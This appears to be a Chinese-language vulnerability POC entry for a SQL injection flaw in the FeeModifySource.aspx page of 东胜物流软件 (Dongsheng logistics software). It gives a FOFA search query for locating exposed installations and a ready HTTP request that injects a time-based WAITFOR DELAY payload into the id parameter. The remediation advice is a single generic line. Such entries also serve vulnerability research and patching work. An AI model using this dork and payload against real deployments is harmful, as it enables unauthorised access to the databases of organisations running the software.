# 东胜物流软件 FeeModifySource.aspx SQL注入漏洞

东胜物流软件 FeeModifySource.aspx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

东胜物流软件 

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="东胜物流软件-物流软件"

POC/EXP：

```
GET /Shipping/FeeModifySource.aspx?handle=apply&applystate=1&checkstate=1&applytype=1&oplb=1&id=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 127.0.0.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

![image-20260108141953911](assets/image-20260108141953911.png)

```

```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
